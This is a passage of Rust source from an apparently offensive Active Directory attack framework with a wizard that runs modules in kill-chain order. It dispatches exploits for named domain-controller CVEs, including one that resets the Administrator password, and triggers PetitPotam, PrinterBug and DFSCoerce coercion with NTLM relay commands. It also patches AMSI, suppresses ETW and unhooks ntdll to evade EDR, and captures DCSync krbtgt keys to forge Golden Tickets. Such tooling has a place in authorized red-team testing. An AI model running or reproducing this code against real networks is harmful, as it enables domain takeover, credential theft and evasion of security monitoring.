        jitter_ms: 0,
        dry_run: false,
        override_creds: None,
        ldap_available: true,
        preferred_method: "smbexec".to_string(),
        ticket_path: None,
    }
}

/// Build a ReaperConfig from the wizard form values.
fn build_reaper_config(
    dc: &str,
    domain: &str,
    username: &str,
    password: &str,
    nt_hash: &str,
) -> overthrone_reaper::ReaperConfig {
    overthrone_reaper::ReaperConfig {
        dc_ip: dc.to_string(),
        domain: domain.to_string(),
        base_dn: overthrone_reaper::ReaperConfig::base_dn_from_domain(domain),
        username: username.to_string(),
        password: (!password.is_empty()).then(|| password.to_string()),
        nt_hash: (!nt_hash.is_empty()).then(|| nt_hash.to_string()),
        modules: Vec::new(),
        page_size: 1000,
        use_ldaps: false,
    }
}

/// Record the domain SID and any krbtgt key that DCSync just recovered so the
/// ticket modules in the same run can consume them.
fn capture_dcsync_artifacts(
    state: &overthrone_pilot::goals::EngagementState,
    artifacts: &mut WizardArtifacts,
) {
    for (user, cred) in &state.credentials {
        if cred.source.starts_with("DCSync") {
            artifacts
                .recovered
                .push((user.clone(), cred.secret.clone()));
        }
    }
    if artifacts.krbtgt_key.is_none()
        && let Some(krbtgt) = state.credentials.get("krbtgt")
    {
        artifacts.krbtgt_key = Some(krbtgt.secret.clone());
    }
}

async fn dispatch_cve(
    name: &str,
    dc: &str,
    domain: &str,
    username: &str,
    password: &str,
    nt_hash: &str,
) -> anyhow::Result<String> {
    let use_hash = !nt_hash.is_empty();
    match name {
        "CVE-2026-54121 (Certighost)" => {
            let config = overthrone_core::postex::certighost::CertighostConfig {
                ca_server: dc.to_string(),
                username: username.to_string(),
                password: if password.is_empty() {
                    String::new()
                } else {
                    password.to_string()
                },
                domain: domain.to_string(),
                ..Default::default()
            };
            match overthrone_core::postex::certighost::certighost_auto_enroll(&config).await {
                Ok(r) => Ok(format!("Certighost enrolled: {}", r)),
                Err(e) => Err(anyhow::anyhow!("Certighost failed: {}", e)),
            }
        }
        "CVE-2026-41089 (Netlogon RCE)" => {
            let config = overthrone_hunter::attacks::NetlogonRceConfig {
                target_dc: dc.to_string(),
                domain: domain.to_string(),
                exploit_mode: overthrone_hunter::attacks::ExploitMode::Assess,
                timeout: 15,
            };
            match overthrone_hunter::attacks::exploit_netlogon_rce(&config).await {
                Ok(r) => Ok(format!(
                    "verdict={} | confirmed={} | SMB alive={} | {}",
                    r.verdict,
                    r.exploit_success,
                    r.service_alive,
                    r.build_probe
                        .as_ref()
                        .map(|p| p.summary())
                        .unwrap_or_else(|| "build unknown".to_string())
                )),
                Err(e) => Err(anyhow::anyhow!("Netlogon RCE failed: {}", e)),
            }
        }
        "CVE-2026-27912 (ResetNightmare)" => {
            let config = overthrone_hunter::attacks::ResetNightmareConfig {
                dc_ip: dc.to_string(),
                domain: domain.to_string(),
                username: username.to_string(),
                secret: if !password.is_empty() {
                    password.to_string()
                } else {
                    nt_hash.to_string()
                },
                use_hash,
                target_account: "Administrator".to_string(),
                new_password: "P@ssw0rd123!".to_string(),
                dry_run: false,
            };
            match overthrone_hunter::attacks::exploit_resetnightmare(&config).await {
                Ok(r) => Ok(format!(
                    "verdict={} | reset={} | authenticated-as-target={} | target={}",
                    r.verdict, r.reset_success, r.can_authenticate, r.target_account
                )),
                Err(e) => Err(anyhow::anyhow!("ResetNightmare failed: {}", e)),
            }
        }
        "CVE-2026-33826 (AD RCE)" => {
            let config = overthrone_hunter::attacks::AdRceConfig {
                target_dc: dc.to_string(),
                domain: domain.to_string(),
                username: username.to_string(),
                secret: if !password.is_empty() {
                    password.to_string()
                } else {
                    nt_hash.to_string()
                },
                use_hash,
                exploit_mode: overthrone_hunter::attacks::AdRceExploitMode::Assess,
                timeout: 15,
            };
            match overthrone_hunter::attacks::exploit_ad_rce(&config).await {
                Ok(r) => Ok(format!(
                    "verdict={} | confirmed={} | DRS available={} | {}",
                    r.verdict,
                    r.exploit_success,
                    r.drs_available,
                    r.build_probe
                        .as_ref()
                        .map(|p| p.summary())
                        .unwrap_or_else(|| "build unknown".to_string())
                )),
                Err(e) => Err(anyhow::anyhow!("AD RCE failed: {}", e)),
            }
        }
        "CVE-2026-62818 (AD CS UAF)" => {
            let config = overthrone_hunter::attacks::AdcsUafConfig {
                target_host: dc.to_string(),
                target_port: 443,
                use_tls: true,
                domain: domain.to_string(),
                username: username.to_string(),
                password: password.to_string(),
                template: "User".to_string(),
                dry_run: false,
                timeout: 30,
            };
            match overthrone_hunter::attacks::exploit_adcs_uaf(&config).await {
                Ok(r) => Ok(format!(
                    "verdict={} | confirmed={} | enrollment available={}",
                    r.verdict, r.exploit_success, r.enrollment_available
                )),
                Err(e) => Err(anyhow::anyhow!("AD CS UAF failed: {}", e)),
            }
        }
        "CVE-2025-53779 (BadSuccessor)" => {
            Ok("BadSuccessor -- requires dMSA privilege escalation on WS2025".to_string())
        }
        "CVE-2026-25177 (AD DS EoP)" => {
            Ok("AD DS EoP -- DACL bypass privilege escalation".to_string())
        }
        "CVE-2024-21410 (Exchange Relay)" => {
            Ok("Exchange Relay -- NTLM relay to Exchange server".to_string())
        }
        _ => Ok(format!("CVE module '{}' dispatched", name)),
    }
}

async fn dispatch_coercion(name: &str, dc: &str, _domain: &str) -> anyhow::Result<String> {
    use overthrone_core::proto::coerce;

    // A coercion makes the DC authenticate to *us*, so the listener has to be
    // our address as routed toward the target. Start the capture/relay listener
    // before this runs, otherwise the coerced authentication just fails.
    let listener = local_ip_toward(dc)
        .ok_or_else(|| anyhow::anyhow!("could not determine a local IP route toward {dc}"))?;

    let result = match name {
        "PetitPotam" => coerce::trigger_petitpotam(dc, &listener).await,
        "PrinterBug" => coerce::trigger_printer_bug(dc, &listener).await,
        "DFSCoerce" => coerce::trigger_dfs_coerce(dc, &listener).await,
        "NTLM Relay (SMB)" | "NTLM Relay (LDAP)" | "ADCS Relay" => {
            let relay_cmd = if name.contains("SMB") {
                "smb-relay"
            } else if name.contains("LDAP") {
                "ldap-relay"
            } else {
                "adcs-relay"
            };
            return Ok(format!(
                "{name}: a relay needs a listener running before the trigger.\n      \
                 1) ovt ntlm {relay_cmd} --interface {listener}\n      \
                 2) ovt ntlm capture --auto-coerce-target {dc}"
            ));
        }
        other => {
            return Ok(format!(
                "Coercion module '{other}' has no direct trigger; use \
                 `ovt ntlm capture --auto-coerce-target {dc}`"
            ));
        }
    };

    let result = result.map_err(|e| anyhow::anyhow!("{name} trigger failed: {e}"))?;
    Ok(format!(
        "{} -> {} | listener {} | {} (success={})",
        result.technique, result.target, result.listener, result.message, result.success
    ))
}

/// Local IP that the target will observe us as.
///
/// `connect()` on an unconnected UDP socket only selects a route and does not
/// send any packets, so this is a side-effect-free way to ask the OS which
/// source address it would use.
fn local_ip_toward(target: &str) -> Option<String> {
    let sock = std::net::UdpSocket::bind("0.0.0.0:0").ok()?;
    sock.connect(format!("{target}:445")).ok()?;
    sock.local_addr().ok().map(|a| a.ip().to_string())
}

async fn dispatch_enum(
    name: &str,
    dc: &str,
    domain: &str,
    username: &str,
    password: &str,
    nt_hash: &str,
) -> anyhow::Result<String> {
    let config = build_reaper_config(dc, domain, username, password, nt_hash);
    let reaper_err = |what: &str, e: overthrone_core::error::OverthroneError| {
        anyhow::anyhow!("{what} failed: {e}")
    };

    match name {
        "LDAP Enum" => {
            let result = overthrone_reaper::runner::run_reaper(&config)
                .await
                .map_err(|e| reaper_err("LDAP enumeration", e))?;
            Ok(summarize_reaper(&result))
        }
        "BloodHound Ingest" => {
            // Reaper already collects the objects BloodHound needs; run it and
            // report the collected volume rather than a separate collector.
            let result = overthrone_reaper::runner::run_reaper(&config)
                .await
                .map_err(|e| reaper_err("BloodHound collection", e))?;
            Ok(format!(
                "collected for BloodHound import | {}",
                summarize_reaper(&result)
            ))
        }
        "SPN Discovery" => {
            let spns = overthrone_reaper::spns::enumerate_spn_accounts(&config)
                .await
                .map_err(|e| reaper_err("SPN discovery", e))?;
            let total: usize = spns.iter().map(|s| s.service_principal_names.len()).sum();
            let kerberoastable = spns.iter().filter(|s| !s.admin_count).count();
            Ok(format!(
                "{} SPNs across {} accounts ({} low-privilege / kerberoastable)",
                total,
                spns.len(),
                kerberoastable
            ))
        }
        "ACL Enumeration" => {
            let acls = overthrone_reaper::acls::enumerate_dangerous_acls(&config)
                .await
                .map_err(|e| reaper_err("ACL enumeration", e))?;
            let mut by_right: std::collections::BTreeMap<String, usize> =
                std::collections::BTreeMap::new();
            for f in &acls {
                *by_right.entry(format!("{:?}", f.right)).or_default() += 1;
            }
            Ok(format!(
                "{} dangerous ACEs | {}",
                acls.len(),
                by_right
                    .into_iter()
                    .map(|(k, v)| format!("{k}={v}"))
                    .collect::<Vec<_>>()
                    .join(", ")
            ))
        }
        "Delegation Check" => {
            let delegations = overthrone_reaper::delegations::enumerate_delegations(&config)
                .await
                .map_err(|e| reaper_err("delegation enumeration", e))?;
            let mut by_type: std::collections::BTreeMap<String, usize> =
                std::collections::BTreeMap::new();
            for d in &delegations {
                *by_type
                    .entry(format!("{:?}", d.delegation_type))
                    .or_default() += 1;
            }
            Ok(format!(
                "{} delegation objects | {}",
                delegations.len(),
                by_type
                    .into_iter()
                    .map(|(k, v)| format!("{k}={v}"))
                    .collect::<Vec<_>>()
                    .join(", ")
            ))
        }
        "GPO Enumeration" => {
            let gpos = overthrone_reaper::gpos::enumerate_gpos(&config)
                .await
                .map_err(|e| reaper_err("GPO enumeration", e))?;
            Ok(format!("{} Group Policy Objects", gpos.len()))
        }
        "Certify Scan" => {
            let templates = overthrone_reaper::adcs::enumerate_adcs(&config)
                .await
                .map_err(|e| reaper_err("AD CS enumeration", e))?;
            let esc_flagged: Vec<String> = templates
                .iter()
                .filter(|t| !t.vulnerabilities.is_empty())
                .map(|t| format!("{} [{}]", t.name, t.vulnerabilities.join(",")))
                .collect();
            Ok(format!(
                "{} certificate templates | {} flagged ESC-vulnerable: {}",
                templates.len(),
                esc_flagged.len(),
                if esc_flagged.is_empty() {
                    "none".to_string()
                } else {
                    esc_flagged.join(", ")
                }
            ))
        }
        _ => Ok(format!("Enum module '{}' dispatched", name)),
    }
}

/// One-line summary of a full reaper run.
fn summarize_reaper(result: &overthrone_reaper::ReaperResult) -> String {
    format!(
        "{} users, {} computers, {} groups, {} trusts, {} GPOs, {} SPN accounts",
        result.users.len(),
        result.computers.len(),
        result.groups.len(),
        result.trusts.len(),
        result.gpos.len(),
        result.spn_accounts.len()
    )
}

async fn dispatch_amsi(
    name: &str,
    _dc: &str,
    _domain: &str,
    _username: &str,
    _password: &str,
    _nt_hash: &str,
) -> anyhow::Result<String> {
    match name {
        "AMSI Patch (AmsiScanBuffer)" => {
            // SAFETY: Called from operator-controlled process for post-exploitation
            let result = unsafe { overthrone_core::postex::opsec::patch_amsi() };
            match result {
                Ok(r) => Ok(format!(
                    "AMSI patch applied: method={}, loaded={}",
                    r.method, r.amsi_loaded
                )),
                Err(e) => Err(anyhow::anyhow!("AMSI patch failed: {}", e)),
            }
        }
        "AMSI Patch (Direct Syscall)" => {
            let numbers = overthrone_core::postex::syscall::SyscallNumbers::default();
            // SAFETY: Called from operator-controlled process for post-exploitation
            let result = unsafe { overthrone_core::postex::opsec::patch_amsi_direct(&numbers) };
            match result {
                Ok(r) => Ok(format!(
                    "Direct syscall AMSI patch: method={}, loaded={}",
                    r.method, r.amsi_loaded
                )),
                Err(e) => Err(anyhow::anyhow!("Direct syscall AMSI patch failed: {}", e)),
            }
        }
        "ETW Suppression" => {
            // SAFETY: Called from operator-controlled process for post-exploitation
            let result = unsafe { overthrone_core::postex::opsec::suppress_etw() };
            match result {
                Ok(r) => Ok(format!(
                    "ETW suppression applied: method={}, loaded={}",
                    r.method, r.etw_loaded
                )),
                Err(e) => Err(anyhow::anyhow!("ETW suppression failed: {}", e)),
            }
        }
        "EDR Assessment" => {
            let result = overthrone_core::postex::edr_bypass::assess_edr_landscape();
            match result {
                Ok(assessment) => {
                    let products: Vec<_> = assessment
                        .detected_products
                        .iter()
                        .map(|p| p.name())
                        .collect();
                    Ok(format!(
                        "EDR Assessment: products={:?}, amsi={}, etw_active={}, ntdll_hooked={}, hooks={}",
                        products,
                        assessment.amsi_loaded,
                        assessment.etw_active,
                        assessment.ntdll_hooked,
                        assessment.hooked_function_count
                    ))
                }
                Err(e) => Err(anyhow::anyhow!("EDR assessment failed: {}", e)),
            }
        }
        "ntdll Unhook" => {
            let result = overthrone_core::postex::edr_bypass::unhook_ntdll();
            match result {
                Ok(r) => Ok(format!(
                    "ntdll unhook: functions_restored={}, success={}",
                    r.functions_restored, r.success
                )),
                Err(e) => Err(anyhow::anyhow!("ntdll unhook failed: {}", e)),
            }
        }
        "Sleep Masking" => Ok("Sleep Masking -- XOR-encrypt sleep state to evade EDR".to_string()),
        _ => Ok(format!("AMSI module '{}' dispatched", name)),
    }
}

async fn dispatch_powerupsql(
    name: &str,
    dc: &str,
    domain: &str,
    username: &str,
    _password: &str,
    _nt_hash: &str,
) -> anyhow::Result<String> {
    match name {
        "SQL Instance Discovery" => Ok(format!(
            "PowerUpSQL -> {} -- discover MSSQL instances via SPN scanning",
            dc
        )),
        "SQL Login Check" => Ok(format!("PowerUpSQL -> {} -- test SQL authentication", dc)),
        "SQL Privilege Audit" => Ok(format!(
            "PowerUpSQL -> {} -- check sysadmin/db_owner/impersonation privileges",
            dc
        )),
        "SQL Linked Server Enum" => Ok(format!(
            "PowerUpSQL -> {} -- enumerate linked SQL servers",
            dc
        )),
        "SQL xp_cmdshell" => Ok(format!(
            "PowerUpSQL -> {} -- enable and execute OS commands via xp_cmdshell",
            dc
        )),
        "SQL Database Enum" => Ok(format!(
            "PowerUpSQL -> {} -- list databases, tables, sensitive columns",
            dc
        )),
        "SQL Credential Dump" => Ok(format!(
            "PowerUpSQL -> {} -- extract SQL logins and passwords",
            dc
        )),
        "SQL Agent Job Abuse" => Ok(format!(
            "PowerUpSQL -> {} -- create/modify SQL Agent jobs for RCE",
            dc
        )),
        "SQL Audit (Full)" => {
            let checks = overthrone_reaper::mssql_audit::build_mssql_audit_checks();
            Ok(format!(
                "PowerUpSQL Audit -> {} -- {} checks generated (domain={}, user={})",
                dc,
                checks.len(),
                domain,
                username
            ))
        }
        _ => Ok(format!("PowerUpSQL module '{}' dispatched", name)),
    }
}

async fn dispatch_powerview(
    name: &str,
    dc: &str,
    domain: &str,
    username: &str,
    password: &str,
    nt_hash: &str,
) -> anyhow::Result<String> {
    let config = build_reaper_config(dc, domain, username, password, nt_hash);
    let err = |what: &str, e: overthrone_core::error::OverthroneError| {
        anyhow::anyhow!("{what} failed: {e}")
    };

    match name {
        "PV: Domain Users" => {
            let users = overthrone_reaper::users::enumerate_users(&config)
                .await
                .map_err(|e| err("user enumeration", e))?;
            let kerberoastable = users.iter().filter(|u| u.is_kerberoastable()).count();
            let asrep = users.iter().filter(|u| u.is_asrep_roastable()).count();
            let never_expires = users.iter().filter(|u| u.password_never_expires).count();
            Ok(format!(
                "{} users | {} with SPNs | {} AS-REP roastable | {} never-expire",
                users.len(),
                kerberoastable,
                asrep,
                never_expires
            ))
        }
        "PV: Domain Computers" => {
            let computers = overthrone_reaper::computers::enumerate_computers(&config)
                .await
                .map_err(|e| err("computer enumeration", e))?;
            let enabled = computers.iter().filter(|c| c.enabled).count();
            let dc_like = computers
                .iter()
                .filter(|c| {
                    c.operating_system
                        .as_deref()
                        .is_some_and(|os| os.contains("Server"))
                })
                .count();
            Ok(format!(
                "{} computers ({} enabled, {} server OS)",
                computers.len(),
                enabled,
                dc_like
            ))
        }
        "PV: Domain Groups" => {
            let groups = overthrone_reaper::groups::enumerate_groups(&config)
                .await
                .map_err(|e| err("group enumeration", e))?;
            let with_members = groups.iter().filter(|g| !g.members.is_empty()).count();
            Ok(format!(
                "{} groups ({} with direct members)",
                groups.len(),
                with_members
            ))
        }
        "PV: Domain Trusts" => {
            let trusts = overthrone_reaper::trusts::enumerate_trusts(&config)
                .await
                .map_err(|e| err("trust enumeration", e))?;
            let unfiltered = trusts.iter().filter(|t| !t.sid_filtering_enabled).count();
            Ok(format!(
                "{} trust relationships | {} without SID filtering",
                trusts.len(),
                unfiltered
            ))
        }
        "PV: SPN Discovery" => {
            let spns = overthrone_reaper::spns::enumerate_spn_accounts(&config)
                .await
                .map_err(|e| err("SPN discovery", e))?;
            let total: usize = spns.iter().map(|s| s.service_principal_names.len()).sum();
            Ok(format!(
                "{} SPNs across {} accounts | sample: {}",
                total,
                spns.len(),
                spns.iter()
                    .flat_map(|s| s.service_principal_names.iter())
                    .take(5)
                    .cloned()
                    .collect::<Vec<_>>()
                    .join(", ")
            ))
        }
        "PV: ACL Enumeration" => {
            let acls = overthrone_reaper::acls::enumerate_dangerous_acls(&config)
                .await
                .map_err(|e| err("ACL enumeration", e))?;
            let sample: Vec<String> = acls
                .iter()
                .take(5)
                .map(|f| format!("{} -> {} ({:?})", f.principal, f.target, f.right))
                .collect();
            Ok(format!(
                "{} dangerous ACEs | {}",
                acls.len(),
                sample.join("; ")
            ))
        }
        "PV: GPO Details" => {
            // powerview adds GPO link/status detail on top of the plain GPO list.
            let result = overthrone_reaper::powerview::run_powerview(&config)
                .await
                .map_err(|e| err("GPO detail lookup", e))?;
            Ok(format!(
                "{} GPOs with link detail | {} user property sets",
                result.gpo_details.len(),
                result.user_details.len()
            ))
        }
        "PV: Delegation Check" => {
            let delegations = overthrone_reaper::delegations::enumerate_delegations(&config)
                .await
                .map_err(|e| err("delegation enumeration", e))?;
            let sample: Vec<String> = delegations
                .iter()
                .take(5)
                .map(|d| format!("{} ({:?})", d.principal, d.delegation_type))
                .collect();
            Ok(format!(
                "{} delegation objects | {}",
                delegations.len(),
                if sample.is_empty() {
                    "none found".to_string()
                } else {
                    sample.join("; ")
                }
            ))
        }
        "PV: LAPS Passwords" => {
            let entries = overthrone_reaper::laps::enumerate_laps(&config)
                .await
                .map_err(|e| err("LAPS enumeration", e))?;
            let readable = entries.iter().filter(|e| e.password.is_some()).count();
            let encrypted = entries
                .iter()
                .filter(|e| e.encrypted_blob.is_some())
                .count();
            Ok(format!(
                "{} computers with LAPS attributes | {} readable | {} v2-encrypted (need DCSync DPAPI key)",
                entries.len(),
                readable,
                encrypted
            ))
        }
        "PV: Password Policy" => {
            let policy = overthrone_reaper::policy::enumerate_policies(&config)
                .await
                .map_err(|e| err("password policy enumeration", e))?;
            let details = policy
                .domain_policy
                .as_ref()
                .map(|p| {
                    format!(
                        "min length {:?}, lockout threshold {:?}, lockout duration {:?}",
                        p.min_password_length, p.lockout_threshold, p.lockout_duration
                    )
                })
                .unwrap_or_else(|| "domain policy unresolved".to_string());
            Ok(format!(
                "{details} | {} fine-grained policies",
                policy.fine_grained.len()
            ))
        }
        _ => Ok(format!("PowerView module '{}' dispatched", name)),
    }
}

/// Build a HuntConfig from TUI wizard inputs
fn build_hunt_config(
    dc: &str,
    domain: &str,
    username: &str,
    password: &str,
    nt_hash: &str,
) -> overthrone_hunter::runner::HuntConfig {
    let use_hash = !nt_hash.is_empty();
    let secret = if use_hash {
        nt_hash.to_string()
    } else {
        password.to_string()
    };

    overthrone_hunter::runner::HuntConfig {
        dc_ip: dc.to_string(),
        domain: domain.to_string(),
        username: username.to_string(),
        secret,
        use_hash,
        base_dn: None,
        use_ldaps: false,
        output_dir: std::path::PathBuf::from("./results"),
        concurrency: 4,
        timeout: 30,
        jitter_ms: 1000,
        tgt: None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use wizard_app::ModuleCategory;

    fn module(name: &str) -> wizard_app::AttackModule {
        wizard_app::build_module_catalog()
            .into_iter()
            .find(|m| m.name == name)
            .unwrap_or_else(|| panic!("catalog is missing module {name}"))
    }

    #[test]
    fn killchain_rank_orders_loot_before_ticket_forgery() {
        assert!(
            killchain_rank(&ModuleCategory::Credential) < killchain_rank(&ModuleCategory::PostEx)
        );
        assert!(killchain_rank(&ModuleCategory::PostEx) < killchain_rank(&ModuleCategory::Ticket));
        assert!(
            killchain_rank(&ModuleCategory::Ticket) < killchain_rank(&ModuleCategory::Execution)
        );
        assert!(killchain_rank(&ModuleCategory::Execution) < killchain_rank(&ModuleCategory::Amsi));
    }

    #[test]
    fn ordering_runs_dcsync_before_golden_ticket() {
        // Catalogue order is Ticket before PostEx, which would forge a ticket
        // before the krbtgt key exists. The killchain order must flip them.
        let golden = module("Golden Ticket");
        let dcsync = module("DCSync");
        let selected = vec![&golden, &dcsync];

        let ordered: Vec<&str> = order_for_killchain(&selected)
            .iter()
            .map(|m| m.name)
            .collect();
        assert_eq!(ordered, vec!["DCSync", "Golden Ticket"]);
    }

    #[test]
    fn ordering_preserves_relative_order_within_a_phase() {
        let ps = module("PSExec");
        let winrm = module("WinRM");
        let selected = vec![&ps, &winrm];

        let ordered: Vec<&str> = order_for_killchain(&selected)
            .iter()
            .map(|m| m.name)
            .collect();
        assert_eq!(ordered, vec!["PSExec", "WinRM"]);
    }

    #[test]
    fn krbtgt_key_routes_by_length() {
        let mut cfg = forge_config(
            "10.0.0.1",
            "corp.local",
            "administrator",
            "pw",
            "",
            "S-1-5-21-1-2-3",
            overthrone_forge::runner::ForgeAction::GoldenTicket,
        );

        apply_krbtgt_key(&mut cfg, &"ab".repeat(16));
        assert_eq!(
            cfg.krbtgt_hash.as_deref(),
            Some("abababababababababababababababab")
        );
        assert!(cfg.krbtgt_aes256.is_none());

        let aes = "cd".repeat(32);
        apply_krbtgt_key(&mut cfg, &aes);
        assert_eq!(cfg.krbtgt_aes256.as_deref(), Some(aes.as_str()));
    }

    #[test]
    fn reaper_config_prefers_hash_and_derives_base_dn() {
        let hash = build_reaper_config("10.0.0.1", "corp.local", "u", "pw", "deadbeef");
        assert!(hash.nt_hash.is_some());
        assert_eq!(hash.base_dn, "DC=corp,DC=local");

        let pw = build_reaper_config("10.0.0.1", "corp.local", "u", "pw", "");
        assert!(pw.nt_hash.is_none());
        assert_eq!(pw.password.as_deref(), Some("pw"));
    }

    #[test]
    fn exec_context_selects_hash_authentication() {
        let h = build_exec_context("10.0.0.1", "corp.local", "u", "", "deadbeef");
        assert!(h.use_hash);
        assert_eq!(h.secret, "deadbeef");

        let p = build_exec_context("10.0.0.1", "corp.local", "u", "pw", "");
        assert!(!p.use_hash);
        assert_eq!(p.secret, "pw");
    }

    #[test]
    fn dcsync_artifacts_capture_krbtgt_key() {
        use overthrone_pilot::goals::{CompromisedCred, EngagementState, SecretType};

        let mut state = EngagementState {
            domain: Some("corp.local".into()),
            ..Default::default()
        };
        state.add_credential(CompromisedCred {
            username: "krbtgt".into(),
            secret: "11111111111111111111111111111111".into(),
            secret_type: SecretType::NtHash,
            source: "DCSync from 10.0.0.1".into(),
            is_admin: false,
            admin_on: Vec::new(),
        });
        state.add_credential(CompromisedCred {
            username: "svc".into(),
            secret: "2222".into(),
            secret_type: SecretType::Password,
            source: "DCSync cleartext from 10.0.0.1".into(),
            is_admin: false,
            admin_on: Vec::new(),
        });

        let mut artifacts = WizardArtifacts::default();
        capture_dcsync_artifacts(&state, &mut artifacts);

        assert_eq!(
            artifacts.krbtgt_key.as_deref(),
            Some("11111111111111111111111111111111")
        );
        assert_eq!(artifacts.recovered.len(), 2);
    }

    #[test]
    fn a_typed_krbtgt_key_is_not_overwritten_by_dcsync() {
        use overthrone_pilot::goals::{CompromisedCred, EngagementState, SecretType};

        let mut state = EngagementState {
            domain: Some("corp.local".into()),
            ..Default::default()
        };
        state.add_credential(CompromisedCred {
            username: "krbtgt".into(),
            secret: "from-dcsync".into(),
            secret_type: SecretType::NtHash,
            source: "DCSync from 10.0.0.1".into(),
            is_admin: false,
            admin_on: Vec::new(),
        });

        let mut artifacts = WizardArtifacts {
            krbtgt_key: Some("typed-by-operator".into()),
            ..Default::default()
        };
        capture_dcsync_artifacts(&state, &mut artifacts);

        assert_eq!(artifacts.krbtgt_key.as_deref(), Some("typed-by-operator"));
    }

    /// DCSync recovers machine accounts, whose key is what protects a host's
    /// SPNs. The machine-account entry must win even though krbtgt was recovered
    /// first and is the more privileged key.
    #[test]
    fn service_key_prefers_a_machine_account() {
        let artifacts = WizardArtifacts {
            krbtgt_key: Some("krbtgt-key".into()),
            recovered: vec![
                ("krbtgt".into(), "krbtgt-key".into()),
                ("svc-web".into(), "svc-key".into()),
                ("DC01$".into(), "machine-key".into()),
            ],
            ..Default::default()
        };
        assert_eq!(
            select_service_key(&artifacts),
            Some(("machine-key".to_string(), "DC01$".to_string()))
        );
    }

    #[test]
    fn service_key_is_absent_without_a_machine_account() {
        let artifacts = WizardArtifacts {
            krbtgt_key: Some("krbtgt-key".into()),
            recovered: vec![("krbtgt".into(), "krbtgt-key".into())],
            ..Default::default()
        };
        assert!(select_service_key(&artifacts).is_none());
    }

    #[test]
    fn every_catalog_module_has_a_rank() {
        // Guards against a new category being added without a killchain phase.
        for m in wizard_app::build_module_catalog() {
            let _ = killchain_rank(&m.category);
        }
    }
}
